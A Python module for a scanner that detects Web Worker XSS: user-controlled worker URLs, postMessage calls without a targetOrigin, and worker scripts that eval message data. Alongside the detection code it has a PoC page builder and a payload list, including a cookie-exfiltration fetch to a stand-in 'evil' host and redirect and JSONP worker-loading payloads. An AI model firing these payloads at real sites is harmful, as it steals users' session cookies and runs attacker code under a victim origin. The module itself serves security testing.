"""Web Worker XSS detection.

Web Workers (``new Worker(url)``, ``new SharedWorker(url)``) execute JS
in a background thread.  Two XSS patterns arise:

  1. **User-controlled worker URL** -- if the URL passed to
     ``new Worker()`` is derived from user input (query parameter, hash
     fragment, ``postMessage`` payload), an attacker can spawn a worker
     that loads attacker JS under the victim origin.  Browsers enforce
     same-origin on the worker script URL, but a same-site open
     redirect or JSONP endpoint on the victim origin bypasses it.

  2. **Reflective worker script** -- the worker script registers an
     ``onmessage`` handler that takes ``e.data`` and feeds it to a sink
     (``eval``, ``new Function``, ``importScripts``, ``setTimeout``).
     Because Workers have no DOM, the typical reflection is
     ``eval(e.data)`` or ``new Function(e.data)()``, or the worker
     posts the data back to a page that sinks it via ``innerHTML``.

Vulnerable worker script::

    onmessage = function(e) {
      eval(e.data);                 // sink! no origin check possible in worker
    };

Vulnerable page::

    var u = new URL(location.href).searchParams.get('worker');
    var w = new Worker(u);          // user-controlled worker URL
    w.postMessage('<img src=x onerror=alert(1)>');   // no targetOrigin

Exploitation:

  * Host a malicious worker script via a same-origin JSONP endpoint or
    open redirect.
  * Spawning the worker runs the script; if the script posts back to a
    page that sinks the message, that yields XSS in the page.
  * ``worker.postMessage(msg)`` without a ``targetOrigin`` is also
    flagged: a malicious worker can be swapped in to receive the
    message and exfiltrate data.

This module:

  1. Detects ``new Worker(...)`` / ``new SharedWorker(...)`` call sites
     and flags user-controlled worker URLs.
  2. Detects ``worker.postMessage(...)`` calls missing a targetOrigin.
  3. If a ``fetcher`` callable is supplied, fetches and analyzes the
     worker script for ``onmessage`` handlers fed by ``e.data`` into
     dangerous sinks.
  4. Builds a PoC HTML page that spawns a worker and posts a payload.
"""
from __future__ import annotations
import re
from typing import Callable, Optional


# ``new Worker(url)`` / ``new SharedWorker(url)`` -- capture the URL.
WORKER_NEW_RE = re.compile(
    r'new\s+(Shared)?Worker\s*\(\s*([^,;)]+)',
    re.IGNORECASE,
)

# ``worker.postMessage(msg [, targetOrigin [, transfer]])`` -- capture the
# argument list so we can count top-level commas to detect targetOrigin.
POST_MESSAGE_RE = re.compile(
    r'(\w+)\s*\.\s*postMessage\s*\(\s*([^)]*)\)',
    re.IGNORECASE,
)

# ``onmessage = function(e) {...}`` inside a worker script.
ONMESSAGE_HANDLER_RE = re.compile(
    r'(?:self\s*\.\s*)?onmessage\s*[\+\-\*\/]?=\s*'
    r'(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)',
    re.IGNORECASE,
)

# ``self.addEventListener('message', ...)`` inside a worker script.
MESSAGE_LISTENER_RE = re.compile(
    r'(?:self\s*\.\s*)?addEventListener\s*\(\s*["\']message["\']',
    re.IGNORECASE,
)

# Reference to the message payload: ``e.data`` / ``event.data`` /
# ``message.data`` and common aliases.
DATA_REF_RE = re.compile(
    r'\b(?:event|e|ev|msg|message|evt|d|data|payload)\.data\b',
    re.IGNORECASE,
)

# Sinks fed by message data inside a worker.  Each entry:
# (regex, severity, description).
DANGER_SINKS: list[tuple[str, str, str]] = [
    (r'\beval\s*\(', "high",
     "eval() of message data in worker"),
    (r'new\s+Function\s*\(', "high",
     "new Function() of message data in worker"),
    (r'setTimeout\s*\(\s*[^,)]*[a-zA-Z]', "high",
     "setTimeout(string) of message data in worker"),
    (r'setInterval\s*\(\s*[^,)]*[a-zA-Z]', "high",
     "setInterval(string) of message data in worker"),
    (r'importScripts\s*\(', "high",
     "importScripts() of message-data URL in worker"),
    (r'\.postMessage\s*\(', "medium",
     "worker posts message back to page (page may sink it)"),
    (r'\bfetch\s*\(\s*[^,)]*[a-zA-Z]', "medium",
     "fetch() of message-data URL in worker"),
    (r'XMLHttpRequest', "medium",
     "XHR of message-data URL in worker"),
]

SINK_RE = re.compile(
    "|".join("(?:%s)" % s[0] for s in DANGER_SINKS),
    re.IGNORECASE,
)

# Indicators that a snippet references user-controlled input on the page.
USER_INPUT_RE = re.compile(
    r'location\s*\.\s*(?:search|hash|href)'
    r'|searchParams\s*\.\s*get'
    r'|new\s+URLSearchParams'
    r'|event\s*\.\s*data'
    r'|message\s*\.\s*data',
    re.IGNORECASE,
)


def find_worker_construction(html_or_js: str) -> list[dict]:
    """Locate ``new Worker(...)`` / ``new SharedWorker(...)`` call sites.

    Returns a list of dicts::

        {
            "snippet":         str,      # ~300 char context
            "url_expr":        str,      # raw expression passed as URL
            "shared":          bool,     # SharedWorker vs Worker
            "user_controlled": bool,     # URL expression references user input
        }
    """
    if not html_or_js:
        return []
    out: list[dict] = []
    for m in WORKER_NEW_RE.finditer(html_or_js):
        shared = bool(m.group(1))
        url_expr = m.group(2).strip().rstrip(',').strip()
        # Wide lookback (300 chars) to capture the variable assignment
        # feeding the Worker constructor -- e.g.
        # ``var u = location.hash.substring(1); new Worker(u)``
        # The taint source is typically 40-150 chars before the match.
        start = max(0, m.start() - 300)
        end = min(len(html_or_js), m.end() + 200)
        snippet = html_or_js[start:end]
        user_controlled = bool(USER_INPUT_RE.search(snippet))
        out.append({
            "snippet": snippet.strip()[:400],
            "url_expr": url_expr,
            "shared": shared,
            "user_controlled": user_controlled,
        })
    return out


def find_postmessage_calls(html_or_js: str) -> list[dict]:
    """Locate ``worker.postMessage(...)`` calls and flag missing targetOrigin.

    Returns a list of dicts::

        {
            "snippet":           str,    # ~300 char context
            "target":            str,    # the worker variable name
            "args":              str,    # raw argument list
            "has_targetorigin":  bool,   # at least 2 args (msg + targetOrigin)
        }
    """
    if not html_or_js:
        return []
    out: list[dict] = []
    for m in POST_MESSAGE_RE.finditer(html_or_js):
        target = m.group(1)
        args = m.group(2).strip()
        # ``postMessage(msg)`` -> 1 arg, no targetOrigin.
        # ``postMessage(msg, "*")`` or ``postMessage(msg, "https://origin")``
        # -> has targetOrigin.  We approximate by counting top-level commas.
        # (Nested commas in object literals are rare for the first arg.)
        has_targetorigin = args.count(',') >= 1
        start = max(0, m.start() - 40)
        end = min(len(html_or_js), m.end() + 150)
        out.append({
            "snippet": html_or_js[start:end].strip()[:300],
            "target": target,
            "args": args,
            "has_targetorigin": has_targetorigin,
        })
    return out


def analyze_worker_script(worker_source: str) -> list[dict]:
    """Analyze a fetched worker script for reflective onmessage sinks.

    Returns a list of dicts::

        {
            "snippet":       str,        # ~600 char context
            "has_handler":   bool,
            "has_data_ref":  bool,       # references e.data
            "sinks_found":   list[str],  # human-readable sink descriptions
            "exploitable":   bool,       # handler + data ref + sink
        }
    """
    if not worker_source:
        return []
    findings: list[dict] = []
    # Both ``onmessage = fn`` and ``addEventListener('message', fn)`` count.
    handler_starts: list[int] = []
    for m in ONMESSAGE_HANDLER_RE.finditer(worker_source):
        handler_starts.append(m.start())
    for m in MESSAGE_LISTENER_RE.finditer(worker_source):
        handler_starts.append(m.start())
    for start_idx in handler_starts:
        end_idx = min(len(worker_source), start_idx + 800)
        snippet = worker_source[max(0, start_idx - 40):end_idx]
        has_data_ref = bool(DATA_REF_RE.search(snippet))
        sinks_found = [desc for pat, _, desc in DANGER_SINKS
                       if re.search(pat, snippet, re.IGNORECASE)]
        has_sink = bool(sinks_found)
        exploitable = has_data_ref and has_sink
        findings.append({
            "snippet": snippet.strip()[:600],
            "has_handler": True,
            "has_data_ref": has_data_ref,
            "sinks_found": sinks_found,
            "exploitable": exploitable,
        })
    return findings


def _looks_like_url_literal(expr: str) -> bool:
    """Whether ``expr`` looks like a URL literal we can fetch statically."""
    if not expr:
        return False
    return (
        expr.startswith('/')
        or expr.startswith('./')
        or expr.startswith('../')
        or expr.startswith('//')
        or re.match(r'^https?://', expr, re.IGNORECASE) is not None
    )


def analyze_page(
    html: str,
    fetcher: Optional[Callable[[str], Optional[str]]] = None,
) -> dict:
    """Analyze a page for Web Worker XSS issues.

    Args:
        html: page HTML (or raw JS).
        fetcher: optional callable that takes a URL and returns the worker
            script body as a string (or ``None`` on error).

    Returns::

        {
            "has_worker":       bool,        # any Worker construction found
            "vulnerable_count": int,
            "workers":          list[dict],  # exploitable findings
            "exploitable":      bool,
        }
    """
    if not html:
        return {
            "has_worker": False,
            "vulnerable_count": 0,
            "workers": [],
            "exploitable": False,
        }
    constructions = find_worker_construction(html)
    postmessages = find_postmessage_calls(html)
    workers: list[dict] = []

    # User-controlled worker URL is the strongest signal.
    for c in constructions:
        if c["user_controlled"]:
            workers.append({
                "type": "construction",
                **c,
                "exploitable": True,
            })

    # ``postMessage`` without targetOrigin leaks data to any origin; if the
    # worker later posts back, that data may reach a page sink.
    for pm in postmessages:
        if not pm["has_targetorigin"]:
            workers.append({
                "type": "postmessage_no_targetorigin",
                **pm,
                "exploitable": True,
            })

    # If a fetcher is supplied, fetch and analyze each worker script that
    # looks like a static URL literal.
    if fetcher and constructions:
        for c in constructions:
            url_expr = c["url_expr"].strip().strip('"\'`')
            if not _looks_like_url_literal(url_expr):
                continue
            try:
                w_src = fetcher(url_expr)
            except Exception:
                w_src = None
            if not w_src:
                continue
            for finding in analyze_worker_script(w_src):
                if finding["exploitable"]:
                    workers.append({
                        "type": "worker_script",
                        "worker_url": url_expr,
                        **finding,
                    })

    vulnerable_count = len(workers)
    return {
        "has_worker": bool(constructions),
        "vulnerable_count": vulnerable_count,
        "workers": workers,
        "exploitable": vulnerable_count > 0,
    }


def build_poc_html(
    target_url: str,
    worker_url: str,
    payload: str = "<img src=x onerror=alert(1)>",
) -> str:
    """Build a PoC HTML page that spawns a worker and posts a payload.

    The PoC loads ``worker_url`` (typically an attacker-controlled worker
    script served via a same-origin redirect/JSONP) and posts ``payload``
    to it.  If the worker reflects the payload into a sink (eval, postMessage
    back to a page that sinks it), the payload executes.
    """
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>Web Worker XSS PoC</title></head>
<body>
<h2>Web Worker XSS PoC</h2>
<p>Victim: <code>{target_url}</code></p>
<p>Worker script: <code>{worker_url}</code></p>
<p>Payload: <code>{payload}</code></p>
<script>
  try {{
    var w = new Worker("{worker_url}");
    w.onmessage = function (e) {{
      // If the worker posts the payload back, sink it (PoC only).
      try {{ eval(e.data); }} catch (x) {{}}
    }};
    w.postMessage({repr(payload)});
  }} catch (e) {{
    console.log("Worker spawn failed:", e);
  }}
</script>
</body></html>
"""


def dangerous_payloads() -> list[str]:
    """High-yield payloads for Web Worker XSS testing."""
    return [
        # Worker script body payloads
        "onmessage=e=>eval(e.data);",
        "onmessage=e=>new Function(e.data)();",
        "onmessage=e=>importScripts(e.data);",
        "onmessage=e=>setTimeout(e.data,0);",
        "self.addEventListener('message',e=>postMessage(e.data));",
        # Page-side payloads (posted to the worker)
        "alert(1)",
        "<img src=x onerror=alert(1)>",
        "fetch('//evil/?c='+document.cookie)",
        # Worker URL payloads (when new Worker() takes user input)
        "/redirect?to=//evil/w.js",
        "//victim.example/jsonp?cb=onmessage=e=>eval(e.data)//",
    ]
